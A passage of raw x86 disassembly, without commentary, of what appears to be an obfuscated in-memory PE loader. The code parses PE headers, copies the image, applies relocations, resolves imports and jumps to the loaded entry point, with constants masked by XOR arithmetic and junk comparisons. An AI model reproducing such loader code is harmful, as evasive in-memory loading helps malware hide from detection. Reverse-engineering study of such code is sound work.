  425649:	mov    BYTE PTR [ecx+0x1],0x1a
  42564d:	mov    BYTE PTR [eax+0x9],0x2f
  425651:	leave  
  425652:	ret    0x4
  425655:	push   ebp
  425656:	mov    ebp,esp
  425658:	push   ecx
  425659:	push   ecx
  42565a:	lea    eax,[ebp-0x8]
  42565d:	mov    DWORD PTR [ebp-0x4],eax
  425660:	push   esi
  425661:	mov    esi,DWORD PTR [ebp-0x4]
  425664:	mov    eax,0x7060e3e
  425669:	mov    DWORD PTR [esi],eax
  42566b:	mov    esi,DWORD PTR [ebp-0x8]
  42566e:	cmp    esi,eax
  425670:	pop    esi
  425671:	jne    0x42567d
  425673:	mov    BYTE PTR [edx+0x4],0x14
  425677:	mov    WORD PTR [ecx+0x3],0x141f
  42567d:	mov    BYTE PTR [edx],0x40
  425680:	leave  
  425681:	ret    
  425682:	push   ebp
  425683:	mov    ebp,esp
  425685:	push   ecx
  425686:	push   ecx
  425687:	lea    eax,[ebp-0x8]
  42568a:	mov    DWORD PTR [ebp-0x4],eax
  42568d:	mov    edx,DWORD PTR [ebp-0x4]
  425690:	mov    eax,0xf8870b3f
  425695:	mov    DWORD PTR [edx],eax
  425697:	mov    edx,DWORD PTR [ebp-0x8]
  42569a:	cmp    edx,eax
  42569c:	jne    0x4256a9
  42569e:	mov    eax,DWORD PTR [ebp+0x8]
  4256a1:	mov    BYTE PTR [ecx+0x8],0x10
  4256a5:	mov    BYTE PTR [eax+0x1],0x1a
  4256a9:	mov    BYTE PTR [ecx+0x5],0xc
  4256ad:	leave  
  4256ae:	ret    0x4
  4256b1:	push   esi
  4256b2:	mov    ecx,edi
  4256b4:	call   0x425682
  4256b9:	mov    edx,edi
  4256bb:	mov    ecx,esi
  4256bd:	mov    BYTE PTR [esi],0x20
  4256c0:	call   0x425655
  4256c5:	push   esi
  4256c6:	mov    ecx,edi
  4256c8:	mov    BYTE PTR [esi+0x5],0xc
  4256cc:	call   0x425626
  4256d1:	push   esi
  4256d2:	mov    BYTE PTR [esi+0x6],0x10
  4256d6:	call   0x4255f3
  4256db:	mov    BYTE PTR [esi+0x2],0x15
  4256df:	mov    edx,esi
  4256e1:	jmp    0x4255c3
  4256e6:	push   ebp
  4256e7:	mov    ebp,esp
  4256e9:	push   ecx
  4256ea:	mov    ecx,DWORD PTR [edx+0x194]
  4256f0:	push   esi
  4256f1:	mov    esi,DWORD PTR [ebp+0x8]
  4256f4:	mov    esi,DWORD PTR [esi]
  4256f6:	mov    DWORD PTR [ecx],esi
  4256f8:	mov    ecx,DWORD PTR [edx+0x194]
  4256fe:	mov    ecx,DWORD PTR [ecx]
  425700:	mov    esi,DWORD PTR [edx+0x190]
  425706:	mov    DWORD PTR [esi],ecx
  425708:	mov    eax,DWORD PTR [edx+0x194]
  42570e:	mov    ecx,DWORD PTR [eax]
  425710:	mov    ecx,DWORD PTR [ecx+0x3c]
  425713:	add    ecx,DWORD PTR [eax]
  425715:	mov    DWORD PTR [ebp-0x4],0xf89ca5a5
  42571c:	mov    eax,DWORD PTR [ebp-0x4]
  42571f:	movzx  ecx,WORD PTR [ecx+0x16]
  425723:	xor    eax,0x75108af
  425728:	add    eax,0x3272f6
  42572d:	pop    esi
  42572e:	test   ecx,eax
  425730:	je     0x42573e
  425732:	mov    eax,DWORD PTR [edx+0x1c8]
  425738:	mov    DWORD PTR [eax],0xf89c85a4
  42573e:	leave  
  42573f:	ret    0x4
  425742:	push   ebp
  425743:	mov    ebp,esp
  425745:	sub    esp,0x70
  425748:	and    DWORD PTR [ebp-0x20],0x0
  42574c:	mov    DWORD PTR [ebp-0x18],0xf89cb5a5
  425753:	mov    DWORD PTR [ebp-0x1c],0xf89c85e5
  42575a:	mov    DWORD PTR [ebp-0x2c],0xf89c85a1
  425761:	mov    DWORD PTR [ebp-0x14],0xf89c85a3
  425768:	mov    DWORD PTR [ebp-0x2c],0xf89f05a5
  42576f:	mov    eax,DWORD PTR [ebp+0x20]
  425772:	mov    eax,DWORD PTR [eax+0x194]
  425778:	mov    DWORD PTR [ebp-0xc],eax
  42577b:	mov    eax,DWORD PTR [ebp+0x20]
  42577e:	push   ebx
  42577f:	push   esi
  425780:	mov    esi,DWORD PTR [eax+0x190]
  425786:	mov    eax,DWORD PTR [ebp+0x20]
  425789:	mov    eax,DWORD PTR [eax+0x18c]
  42578f:	mov    DWORD PTR [ebp-0x8],eax
  425792:	mov    eax,DWORD PTR [eax]
  425794:	push   edi
  425795:	mov    DWORD PTR [ebp-0x4],esi
  425798:	test   eax,eax
  42579a:	jne    0x4257a7
  42579c:	push   DWORD PTR [ebp+0x1c]
  42579f:	mov    edx,DWORD PTR [ebp+0x20]
  4257a2:	call   0x4256e6
  4257a7:	mov    eax,DWORD PTR [esi]
  4257a9:	mov    ebx,DWORD PTR [esi]
  4257ab:	add    ebx,DWORD PTR [eax+0x3c]
  4257ae:	mov    eax,DWORD PTR [ebp+0xc]
  4257b1:	mov    ecx,DWORD PTR [ebp-0x8]
  4257b4:	mov    ecx,DWORD PTR [ecx]
  4257b6:	mov    esi,0x75108af
  4257bb:	xor    eax,esi
  4257bd:	mov    edi,0x3272f6
  4257c2:	add    eax,edi
  4257c4:	cmp    eax,ecx
  4257c6:	jne    0x4259fe
  4257cc:	mov    eax,DWORD PTR [ebp-0xc]
  4257cf:	mov    eax,DWORD PTR [eax]
  4257d1:	mov    DWORD PTR [ebp-0x10],eax
  4257d4:	mov    eax,DWORD PTR [ebx+0x50]
  4257d7:	mov    DWORD PTR [ebp-0x68],eax
  4257da:	mov    eax,DWORD PTR [ebp-0x18]
  4257dd:	xor    eax,esi
  4257df:	add    eax,edi
  4257e1:	mov    DWORD PTR [ebp-0x64],eax
  4257e4:	mov    eax,DWORD PTR [ebp-0x14]
  4257e7:	and    DWORD PTR [ebp-0x6c],0x0
  4257eb:	xor    eax,esi
  4257ed:	add    eax,edi
  4257ef:	mov    DWORD PTR [ebp-0x60],eax
  4257f2:	lea    eax,[ebp-0x70]
  4257f5:	push   eax
  4257f6:	mov    eax,DWORD PTR [ebp+0x8]
  4257f9:	xor    eax,esi
  4257fb:	add    eax,edi
  4257fd:	push   eax
  4257fe:	mov    eax,DWORD PTR [ebp+0x20]
  425801:	add    eax,0xaa
  425806:	push   eax
  425807:	mov    eax,DWORD PTR [ebp+0x20]
  42580a:	mov    eax,DWORD PTR [eax+0x198]
  425810:	mov    DWORD PTR [ebp-0x70],0x4
  425817:	push   DWORD PTR [eax]
  425819:	mov    eax,DWORD PTR [ebp+0x10]
  42581c:	call   eax
  42581e:	mov    ecx,DWORD PTR [ebp-0xc]
  425821:	mov    ecx,DWORD PTR [ecx]
  425823:	mov    edx,DWORD PTR [ebp-0x8]
  425826:	mov    DWORD PTR [ebp-0x6c],eax
  425829:	mov    DWORD PTR [ebp+0x1c],eax
  42582c:	mov    DWORD PTR [edx],ecx
  42582e:	mov    ecx,DWORD PTR [ebp-0x4]
  425831:	mov    DWORD PTR [ecx],eax
  425833:	mov    eax,DWORD PTR [ebx+0x50]
  425836:	mov    DWORD PTR [ebp-0x68],eax
  425839:	mov    eax,DWORD PTR [ebp-0x1c]
  42583c:	xor    eax,esi
  42583e:	add    eax,edi
  425840:	mov    DWORD PTR [ebp-0x64],eax
  425843:	lea    eax,[ebp-0x20]
  425846:	mov    DWORD PTR [ebp-0x60],eax
  425849:	lea    eax,[ebp-0x70]
  42584c:	push   eax
  42584d:	mov    eax,DWORD PTR [ebp+0x8]
  425850:	xor    eax,esi
  425852:	add    eax,edi
  425854:	push   eax
  425855:	mov    eax,DWORD PTR [ebp+0x20]
  425858:	add    eax,0xee
  42585d:	push   eax
  42585e:	mov    eax,DWORD PTR [ebp+0x20]
  425861:	mov    eax,DWORD PTR [eax+0x198]
  425867:	mov    DWORD PTR [ebp-0x70],0x4
  42586e:	push   DWORD PTR [eax]
  425870:	mov    eax,DWORD PTR [ebp+0x10]
  425873:	call   eax
  425875:	test   eax,eax
  425877:	je     0x42589c
  425879:	and    DWORD PTR [ebp+0xc],0x0
  42587d:	cmp    DWORD PTR [ebx+0x50],0x0
  425881:	jbe    0x42589c
  425883:	mov    eax,DWORD PTR [ebp+0x1c]
  425886:	mov    ecx,DWORD PTR [ebp-0x10]
  425889:	sub    ecx,eax
  42588b:	mov    dl,BYTE PTR [ecx+eax*1]
  42588e:	inc    DWORD PTR [ebp+0xc]
  425891:	mov    BYTE PTR [eax],dl
  425893:	mov    edx,DWORD PTR [ebp+0xc]
  425896:	inc    eax
  425897:	cmp    edx,DWORD PTR [ebx+0x50]
  42589a:	jb     0x42588b
  42589c:	mov    edx,DWORD PTR [ebp+0x1c]
  42589f:	mov    ecx,DWORD PTR [edx+0x3c]
  4258a2:	add    ecx,edx
  4258a4:	mov    eax,DWORD PTR [ecx+0xa0]
  4258aa:	mov    ebx,DWORD PTR [ecx+0x28]
  4258ad:	add    eax,edx
  4258af:	sub    edx,DWORD PTR [ebp-0x10]
  4258b2:	add    ebx,DWORD PTR [ebp+0x1c]
  4258b5:	mov    DWORD PTR [ebp+0xc],edx
  4258b8:	mov    DWORD PTR [ebp-0x2c],ecx
  4258bb:	mov    DWORD PTR [ebp-0x14],ebx
  4258be:	mov    DWORD PTR [ebp-0x8],0x0
  4258c5:	jmp    0x425941
  4258c7:	add    edx,0xfffffff8
  4258ca:	shr    edx,1
  4258cc:	mov    DWORD PTR [ebp-0x18],edx
  4258cf:	je     0x42592d
  4258d1:	lea    edx,[eax+0x8]
  4258d4:	mov    DWORD PTR [ebp-0x4],edx
  4258d7:	mov    edx,DWORD PTR [ebp-0x18]
  4258da:	mov    DWORD PTR [ebp-0x18],edx
  4258dd:	mov    edx,DWORD PTR [ebp-0x4]
  4258e0:	movzx  edx,WORD PTR [edx]
  4258e3:	mov    DWORD PTR [ebp-0x24],edx
  4258e6:	and    edx,0xfff
  4258ec:	mov    DWORD PTR [ebp-0x28],edx
  4258ef:	mov    edx,DWORD PTR [ebp-0x24]
  4258f2:	shr    edx,0xc
  4258f5:	add    edx,0xffcd8d0a
  4258fb:	xor    edx,esi
  4258fd:	cmp    edx,0xf89c85a2
  425903:	jne    0x425924
  425905:	mov    edx,DWORD PTR [ebp-0x28]
  425908:	add    edx,DWORD PTR [ebp+0x1c]
  42590b:	mov    ebx,DWORD PTR [eax]
  42590d:	cmp    DWORD PTR [ebx+edx*1],0x0
  425911:	je     0x425921
  425913:	mov    ecx,DWORD PTR [ebp+0xc]
  425916:	add    ecx,DWORD PTR [ebx+edx*1]
  425919:	mov    ebx,DWORD PTR [eax]
  42591b:	mov    DWORD PTR [edx+ebx*1],ecx
  42591e:	mov    ecx,DWORD PTR [ebp-0x2c]
  425921:	mov    ebx,DWORD PTR [ebp-0x14]
  425924:	add    DWORD PTR [ebp-0x4],0x2
  425928:	dec    DWORD PTR [ebp-0x18]
  42592b:	jne    0x4258dd
  42592d:	mov    edx,DWORD PTR [ebp-0xc]
  425930:	add    DWORD PTR [ebp-0x8],edx
  425933:	mov    edx,DWORD PTR [ebp-0x8]
  425936:	cmp    edx,DWORD PTR [ecx+0xa4]
  42593c:	jae    0x42594f
  42593e:	add    eax,DWORD PTR [ebp-0xc]
  425941:	mov    edx,DWORD PTR [eax+0x4]
  425944:	mov    DWORD PTR [ebp-0xc],edx
  425947:	test   edx,edx
  425949:	jne    0x4258c7
  42594f:	mov    eax,DWORD PTR [ebp-0x10]
  425952:	mov    DWORD PTR [ebp-0x6c],eax
  425955:	mov    DWORD PTR [ebp-0x70],0x4
  42595c:	mov    eax,DWORD PTR [ecx+0x50]
  42595f:	mov    DWORD PTR [ebp-0x68],eax
  425962:	mov    eax,DWORD PTR [ebp-0x1c]
  425965:	xor    eax,esi
  425967:	add    eax,edi
  425969:	mov    DWORD PTR [ebp-0x64],eax
  42596c:	lea    eax,[ebp-0x20]
  42596f:	mov    DWORD PTR [ebp-0x60],eax
  425972:	lea    eax,[ebp-0x70]
  425975:	push   eax
  425976:	mov    eax,DWORD PTR [ebp+0x8]
  425979:	xor    eax,esi
  42597b:	add    eax,edi
  42597d:	push   eax
  42597e:	mov    eax,DWORD PTR [ebp+0x20]
  425981:	add    eax,0xee
  425986:	push   eax
  425987:	mov    eax,DWORD PTR [ebp+0x20]
  42598a:	mov    eax,DWORD PTR [eax+0x198]
  425990:	push   DWORD PTR [eax]
  425992:	mov    eax,DWORD PTR [ebp+0x10]
  425995:	call   eax
  425997:	mov    eax,DWORD PTR [ebp+0x20]
  42599a:	mov    eax,DWORD PTR [eax+0x180]
  4259a0:	add    eax,DWORD PTR [ebp+0xc]
  4259a3:	mov    ecx,DWORD PTR [ebp+0xc]
  4259a6:	push   DWORD PTR [ebp+0x18]
  4259a9:	mov    DWORD PTR [eax],ecx
  4259ab:	push   DWORD PTR [ebp+0x14]
  4259ae:	push   DWORD PTR [ebp+0x1c]
  4259b1:	call   ebx
  4259b3:	mov    ecx,DWORD PTR [ebp+0xc]
  4259b6:	add    ecx,DWORD PTR [ebp+0x20]
  4259b9:	lea    eax,[ebp+0x4]
  4259bc:	mov    DWORD PTR [ebp+0x20],ecx
  4259bf:	mov    ecx,DWORD PTR [ebp+0x20]
  4259c2:	mov    ecx,DWORD PTR [ebp+0x20]
  4259c5:	mov    edx,DWORD PTR [ecx+0x190]
  4259cb:	mov    ecx,DWORD PTR [ebp+0x20]
  4259ce:	mov    ecx,DWORD PTR [ecx+0x18c]
  4259d4:	mov    esi,DWORD PTR [ecx]
  4259d6:	cmp    DWORD PTR [eax],esi
  4259d8:	jb     0x4259f9
  4259da:	mov    esi,DWORD PTR [edx]
  4259dc:	mov    edi,DWORD PTR [edx]
  4259de:	mov    esi,DWORD PTR [esi+0x3c]
  4259e1:	lea    esi,[edi+esi*1+0x50]
  4259e5:	mov    edi,DWORD PTR [ecx]
  4259e7:	add    edi,DWORD PTR [esi]
  4259e9:	cmp    DWORD PTR [eax],edi
  4259eb:	jae    0x4259f9
  4259ed:	mov    esi,DWORD PTR [ecx]
  4259ef:	mov    ecx,DWORD PTR [eax]
  4259f1:	mov    edx,DWORD PTR [edx]
  4259f3:	sub    ecx,esi
  4259f5:	add    edx,ecx
  4259f7:	mov    DWORD PTR [eax],edx
  4259f9:	mov    eax,DWORD PTR [ebp+0xc]
  4259fc:	jmp    0x425a00
  4259fe:	xor    eax,eax
  425a00:	pop    edi
  425a01:	pop    esi
  425a02:	pop    ebx
  425a03:	leave  
  425a04:	ret    0x1c
  425a07:	push   ebp
  425a08:	mov    ebp,esp
  425a0a:	sub    esp,0x1c
  425a0d:	push   esi
  425a0e:	mov    esi,eax
  425a10:	mov    eax,DWORD PTR [ecx+0x190]
  425a16:	cmp    DWORD PTR [eax],0x0
  425a19:	je     0x425b29
  425a1f:	test   edx,edx
  425a21:	je     0x425b29
  425a27:	test   esi,esi
  425a29:	je     0x425b29
  425a2f:	mov    eax,DWORD PTR [esi+0x88]
  425a35:	test   eax,eax
  425a37:	je     0x425b24
  425a3d:	cmp    DWORD PTR [esi+0x8c],0x10
  425a44:	je     0x425b24
  425a4a:	cmp    DWORD PTR [esi+0x34],edx
  425a4d:	je     0x425b24
  425a53:	mov    esi,DWORD PTR [ecx+0x18c]
  425a59:	and    DWORD PTR [ebp-0x10],0x0
  425a5d:	mov    ecx,edx
  425a5f:	sub    ecx,DWORD PTR [esi]
  425a61:	add    eax,edx
  425a63:	movzx  edx,WORD PTR [eax+0xc]
  425a67:	mov    DWORD PTR [ebp-0x1c],ecx
  425a6a:	movzx  ecx,WORD PTR [eax+0xe]
  425a6e:	add    ecx,edx
  425a70:	je     0x425b24
  425a76:	lea    ecx,[eax+0x14]
  425a79:	push   ebx
  425a7a:	mov    DWORD PTR [ebp-0x18],ecx
  425a7d:	mov    esi,0x7fffffff
  425a82:	push   edi
  425a83:	test   DWORD PTR [ecx],esi
  425a85:	je     0x425b06
  425a87:	mov    edx,DWORD PTR [ecx]
  425a89:	and    DWORD PTR [ebp-0xc],0x0
  425a8d:	and    edx,esi
  425a8f:	add    edx,eax
  425a91:	movzx  edi,WORD PTR [edx+0xe]
  425a95:	movzx  ebx,WORD PTR [edx+0xc]
  425a99:	add    edi,ebx
  425a9b:	je     0x425b06
  425a9d:	lea    ecx,[edx+0x14]
  425aa0:	mov    DWORD PTR [ebp-0x14],ecx
  425aa3:	test   DWORD PTR [ecx],esi
  425aa5:	je     0x425ae8
  425aa7:	mov    ecx,DWORD PTR [ecx]
  425aa9:	and    DWORD PTR [ebp-0x8],0x0
  425aad:	and    ecx,esi
  425aaf:	add    ecx,eax
  425ab1:	movzx  edi,WORD PTR [ecx+0xe]
  425ab5:	movzx  ebx,WORD PTR [ecx+0xc]
  425ab9:	add    edi,ebx
  425abb:	je     0x425ae8
  425abd:	lea    edi,[ecx+0x14]
  425ac0:	mov    DWORD PTR [ebp-0x4],edi
  425ac3:	mov    edi,DWORD PTR [ebp-0x4]
  425ac6:	mov    edi,DWORD PTR [edi]
  425ac8:	test   edi,edi
  425aca:	je     0x425ad2
  425acc:	mov    ebx,DWORD PTR [ebp-0x1c]
  425acf:	add    DWORD PTR [edi+eax*1],ebx
  425ad2:	movzx  edi,WORD PTR [ecx+0xe]
  425ad6:	movzx  ebx,WORD PTR [ecx+0xc]
  425ada:	inc    DWORD PTR [ebp-0x8]
  425add:	add    DWORD PTR [ebp-0x4],0x8
  425ae1:	add    edi,ebx
  425ae3:	cmp    DWORD PTR [ebp-0x8],edi
  425ae6:	jb     0x425ac3
  425ae8:	movzx  edi,WORD PTR [edx+0xe]
  425aec:	movzx  ebx,WORD PTR [edx+0xc]
  425af0:	mov    ecx,DWORD PTR [ebp-0x14]
  425af3:	inc    DWORD PTR [ebp-0xc]
  425af6:	add    ecx,0x8
  425af9:	add    edi,ebx
  425afb:	mov    DWORD PTR [ebp-0x14],ecx
  425afe:	cmp    DWORD PTR [ebp-0xc],edi
  425b01:	jb     0x425aa3
  425b03:	mov    ecx,DWORD PTR [ebp-0x18]
  425b06:	movzx  edx,WORD PTR [eax+0xe]
  425b0a:	movzx  edi,WORD PTR [eax+0xc]
  425b0e:	inc    DWORD PTR [ebp-0x10]
  425b11:	add    ecx,0x8
  425b14:	add    edx,edi
  425b16:	mov    DWORD PTR [ebp-0x18],ecx
  425b19:	cmp    DWORD PTR [ebp-0x10],edx
  425b1c:	jb     0x425a83
  425b22:	pop    edi
  425b23:	pop    ebx
  425b24:	xor    eax,eax
  425b26:	inc    eax
  425b27:	jmp    0x425b2b
  425b29:	xor    eax,eax
  425b2b:	pop    esi
  425b2c:	leave  
  425b2d:	ret    
  425b2e:	push   ebp
  425b2f:	mov    ebp,esp
  425b31:	mov    ecx,DWORD PTR [ecx+0x190]
  425b37:	mov    eax,DWORD PTR [ebp+0xc]
  425b3a:	sub    esp,0x10
  425b3d:	push   ebx
  425b3e:	xor    ebx,ebx
  425b40:	push   esi
  425b41:	push   edi
  425b42:	cmp    DWORD PTR [ecx],ebx
  425b44:	je     0x425bcc
  425b4a:	cmp    eax,ebx
  425b4c:	je     0x425bcc
  425b4e:	cmp    DWORD PTR [eax+0x78],ebx
  425b51:	jne    0x425b58
  425b53:	xor    eax,eax
  425b55:	inc    eax
  425b56:	jmp    0x425bce
  425b58:	mov    eax,DWORD PTR [eax+0x78]
  425b5b:	add    eax,DWORD PTR [ebp+0x8]
  425b5e:	mov    ecx,DWORD PTR [eax+0x1c]
  425b61:	mov    edx,DWORD PTR [eax+0x24]
  425b64:	mov    esi,DWORD PTR [eax+0x14]
  425b67:	mov    edi,DWORD PTR [eax+0x18]
  425b6a:	add    ecx,DWORD PTR [ebp+0x8]
  425b6d:	add    edx,DWORD PTR [ebp+0x8]
  425b70:	mov    DWORD PTR [ebp-0x4],esi
  425b73:	cmp    esi,edi
  425b75:	ja     0x425b7a
  425b77:	mov    DWORD PTR [ebp-0x4],edi
  425b7a:	mov    DWORD PTR [ebp-0x8],ebx
  425b7d:	cmp    DWORD PTR [ebp-0x4],ebx
  425b80:	jbe    0x425b53
  425b82:	cmp    ebx,DWORD PTR [eax+0x14]
  425b85:	jae    0x425b8d
  425b87:	movzx  esi,WORD PTR [edx+ebx*2]
  425b8b:	jmp    0x425b8f
  425b8d:	mov    esi,ebx
  425b8f:	lea    esi,[ecx+esi*4]
  425b92:	mov    edi,DWORD PTR [esi]
  425b94:	test   edi,edi
  425b96:	je     0x425bc1
  425b98:	add    edi,DWORD PTR [ebp+0x8]
  425b9b:	mov    DWORD PTR [ebp-0x10],edi
  425b9e:	cmp    edi,eax
  425ba0:	jbe    0x425bb2
  425ba2:	mov    ebx,DWORD PTR [ebp+0xc]
  425ba5:	mov    ebx,DWORD PTR [ebx+0x7c]
  425ba8:	add    ebx,eax
  425baa:	cmp    edi,ebx
  425bac:	jae    0x425bb2
  425bae:	mov    esi,DWORD PTR [esi]
  425bb0:	jmp    0x425bba
  425bb2:	sub    edi,DWORD PTR [ebp+0x8]
  425bb5:	mov    DWORD PTR [esi],edi
  425bb7:	mov    esi,DWORD PTR [ebp-0x10]
  425bba:	test   esi,esi
  425bbc:	je     0x425bcc
  425bbe:	mov    ebx,DWORD PTR [ebp-0x8]
  425bc1:	inc    ebx
  425bc2:	mov    DWORD PTR [ebp-0x8],ebx
  425bc5:	cmp    ebx,DWORD PTR [ebp-0x4]
  425bc8:	jb     0x425b82
  425bca:	jmp    0x425b53
  425bcc:	xor    eax,eax
  425bce:	pop    edi
  425bcf:	pop    esi
  425bd0:	pop    ebx
  425bd1:	leave  
  425bd2:	ret    0x8
  425bd5:	push   ebp
  425bd6:	mov    ebp,esp
  425bd8:	sub    esp,0x2c
  425bdb:	mov    edx,0xf89c85a5
  425be0:	mov    DWORD PTR [ebp-0x4],edx
  425be3:	mov    DWORD PTR [ebp-0x8],0xf89c85a4
  425bea:	mov    eax,DWORD PTR [ebp-0x4]
  425bed:	mov    ecx,DWORD PTR [ebp-0x4]
  425bf0:	mov    ecx,DWORD PTR [ebp-0x4]
  425bf3:	mov    ecx,DWORD PTR [ebp-0x4]
  425bf6:	mov    ecx,DWORD PTR [ebp-0x4]
  425bf9:	mov    ecx,DWORD PTR [ebp-0x4]
  425bfc:	push   ebx
  425bfd:	mov    ebx,DWORD PTR [ebp+0x10]
  425c00:	push   esi
  425c01:	mov    esi,0x75108af
  425c06:	mov    DWORD PTR [ebp-0x10],0x352eb2f
  425c0d:	mov    ecx,DWORD PTR [ebp-0x4]
  425c10:	mov    ebx,DWORD PTR [ebx+0x190]
  425c16:	push   edi
  425c17:	mov    edi,0x3272f6
  425c1c:	xor    ecx,esi
  425c1e:	xor    eax,esi
  425c20:	add    eax,edi
  425c22:	add    ecx,edi
  425c24:	mov    DWORD PTR [ebp-0x18],eax
  425c27:	cmp    ecx,DWORD PTR [ebx]
  425c29:	je     0x425eaa
  425c2f:	mov    ebx,DWORD PTR [ebp-0x4]
  425c32:	mov    ecx,DWORD PTR [ebp+0xc]
  425c35:	xor    ebx,esi
  425c37:	add    ebx,edi
  425c39:	cmp    ebx,ecx
  425c3b:	je     0x425eaa
  425c41:	mov    ebx,DWORD PTR [ebp-0x4]
  425c44:	mov    ecx,DWORD PTR [ecx+0x80]
  425c4a:	xor    ebx,esi
  425c4c:	add    ebx,edi
  425c4e:	cmp    ecx,ebx
  425c50:	je     0x425ea5
  425c56:	add    ecx,DWORD PTR [ebp+0x8]
  425c59:	mov    DWORD PTR [ebp-0x2c],ecx
  425c5c:	mov    ebx,edx
  425c5e:	xor    ebx,esi
  425c60:	add    ebx,edi
  425c62:	mov    DWORD PTR [ebp-0x10],ebx
  425c65:	mov    ebx,DWORD PTR [ebp-0x10]
  425c68:	cmp    ebx,edx
  425c6a:	je     0x425c7e
  425c6c:	mov    edx,DWORD PTR [ebp-0x10]
  425c6f:	mov    ebx,DWORD PTR [ebp-0x4]
  425c72:	imul   edx,edx,0x14
  425c75:	xor    ebx,esi
  425c77:	add    ebx,edi
  425c79:	cmp    DWORD PTR [edx+ecx*1],ebx
  425c7c:	jne    0x425c95
  425c7e:	mov    edx,DWORD PTR [ebp-0x10]
  425c81:	mov    ebx,DWORD PTR [ebp-0x4]
  425c84:	imul   edx,edx,0x14
  425c87:	xor    ebx,esi
  425c89:	add    ebx,edi
  425c8b:	cmp    DWORD PTR [edx+ecx*1+0x10],ebx
  425c8f:	je     0x425e97
  425c95:	mov    eax,DWORD PTR [ebp-0x4]
  425c98:	mov    ebx,DWORD PTR [ebp-0x4]
  425c9b:	mov    eax,DWORD PTR [ebp-0x10]
  425c9e:	imul   eax,eax,0x14
  425ca1:	add    eax,ecx
  425ca3:	mov    ecx,DWORD PTR [eax+0x10]
  425ca6:	add    ecx,DWORD PTR [ebp+0x8]
  425ca9:	xor    ebx,esi
  425cab:	mov    DWORD PTR [ebp-0x1c],ecx
  425cae:	mov    ecx,DWORD PTR [ebp-0x4]
  425cb1:	mov    edx,DWORD PTR [ebp-0x4]
  425cb4:	xor    ecx,esi
  425cb6:	add    ecx,edi
  425cb8:	xor    edx,esi
  425cba:	mov    DWORD PTR [ebp-0x24],ecx
  425cbd:	mov    ecx,DWORD PTR [eax]
  425cbf:	add    edx,edi
  425cc1:	add    ebx,edi
  425cc3:	cmp    ecx,edx
  425cc5:	je     0x425ccd
  425cc7:	add    ecx,DWORD PTR [ebp+0x8]
  425cca:	mov    DWORD PTR [ebp-0x24],ecx
  425ccd:	mov    ecx,DWORD PTR [ebp-0x4]
  425cd0:	xor    ecx,esi
  425cd2:	add    ecx,DWORD PTR [eax+0xc]
  425cd5:	mov    eax,DWORD PTR [ebp+0x8]
  425cd8:	lea    eax,[ecx+eax*1+0x3272f6]
  425cdf:	mov    DWORD PTR [ebp+0xc],eax
  425ce2:	mov    DWORD PTR [ebp-0x28],0xf89c85a0
  425ce9:	mov    eax,DWORD PTR [ebp+0x10]
  425cec:	push   DWORD PTR [ebp+0xc]
  425cef:	mov    eax,DWORD PTR [eax+0x1e0]
  425cf5:	call   DWORD PTR [eax]
  425cf7:	mov    ecx,DWORD PTR [ebp-0x4]
  425cfa:	xor    ecx,esi
  425cfc:	add    ecx,edi
  425cfe:	mov    DWORD PTR [ebp-0xc],eax
  425d01:	cmp    ecx,eax
  425d03:	jne    0x425d17
  425d05:	mov    eax,DWORD PTR [ebp+0x10]
  425d08:	push   DWORD PTR [ebp+0xc]
  425d0b:	mov    eax,DWORD PTR [eax+0x1e0]
  425d11:	call   DWORD PTR [eax+0xc]
  425d14:	mov    DWORD PTR [ebp-0xc],eax
  425d17:	mov    DWORD PTR [ebp-0x20],0x7f661b2c
  425d1e:	mov    DWORD PTR [ebp-0x20],0xf89c985c
  425d25:	mov    eax,DWORD PTR [ebp-0x4]
  425d28:	xor    eax,esi
  425d2a:	add    eax,edi
  425d2c:	cmp    eax,DWORD PTR [ebp-0xc]
  425d2f:	jne    0x425d54
  425d31:	mov    eax,DWORD PTR [ebp-0x8]
  425d34:	mov    ecx,DWORD PTR [ebp-0x20]
  425d37:	xor    eax,esi
  425d39:	xor    ecx,esi
  425d3b:	lea    ebx,[ebx+eax*1+0x3272f6]
  425d42:	mov    eax,DWORD PTR [ebp+0x10]
  425d45:	mov    eax,DWORD PTR [eax+0x1e0]
  425d4b:	add    ecx,edi
  425d4d:	imul   ecx,ebx
  425d50:	push   ecx
  425d51:	call   DWORD PTR [eax+0x24]
  425d54:	mov    eax,DWORD PTR [ebp-0x4]
  425d57:	xor    eax,esi
  425d59:	add    eax,edi
  425d5b:	cmp    eax,DWORD PTR [ebp-0xc]
  425d5e:	jne    0x425d6f
  425d60:	mov    eax,DWORD PTR [ebp-0x28]
  425d63:	xor    eax,esi
  425d65:	add    eax,edi
  425d67:	cmp    ebx,eax
  425d69:	jbe    0x425ce9
  425d6f:	mov    eax,DWORD PTR [ebp-0x4]
  425d72:	xor    eax,esi
  425d74:	add    eax,edi
  425d76:	cmp    eax,DWORD PTR [ebp-0xc]
  425d79:	jne    0x425d92
  425d7b:	mov    eax,DWORD PTR [ebp-0x8]
  425d7e:	mov    ecx,DWORD PTR [ebp-0x18]
  425d81:	xor    eax,esi
  425d83:	lea    eax,[ecx+eax*1+0x3272f6]
  425d8a:	mov    DWORD PTR [ebp-0x18],eax
  425d8d:	jmp    0x425e81
  425d92:	mov    DWORD PTR [ebp-0x14],0x1121b2d
  425d99:	mov    DWORD PTR [ebp+0xc],0xe042d2f
  425da0:	mov    ebx,DWORD PTR [ebp-0x4]
  425da3:	xor    ebx,esi
  425da5:	add    ebx,edi
  425da7:	jmp    0x425e6e
  425dac:	mov    eax,DWORD PTR [ebp-0x4]
  425daf:	xor    eax,esi
  425db1:	add    eax,edi
  425db3:	mov    DWORD PTR [ebp-0x14],eax
  425db6:	mov    eax,DWORD PTR [ebp-0x4]
  425db9:	xor    eax,esi
  425dbb:	add    eax,edi
  425dbd:	mov    DWORD PTR [ebp+0xc],eax
  425dc0:	mov    ecx,DWORD PTR [ebp-0x4]
  425dc3:	mov    eax,DWORD PTR [ebp-0x24]
  425dc6:	xor    ecx,esi
  425dc8:	add    ecx,edi
  425dca:	cmp    ecx,eax
  425dcc:	je     0x425dd4
  425dce:	mov    eax,DWORD PTR [eax+ebx*4]
  425dd1:	mov    DWORD PTR [ebp-0x14],eax
  425dd4:	mov    eax,DWORD PTR [ebp-0x1c]
  425dd7:	mov    eax,DWORD PTR [eax+ebx*4]
  425dda:	mov    DWORD PTR [ebp+0xc],eax
  425ddd:	mov    eax,DWORD PTR [ebp-0x4]
  425de0:	mov    ecx,DWORD PTR [ebp-0x14]
  425de3:	xor    eax,esi
  425de5:	add    eax,edi
  425de7:	cmp    eax,ecx
  425de9:	je     0x425e14
  425deb:	mov    eax,DWORD PTR [ebp-0x4]
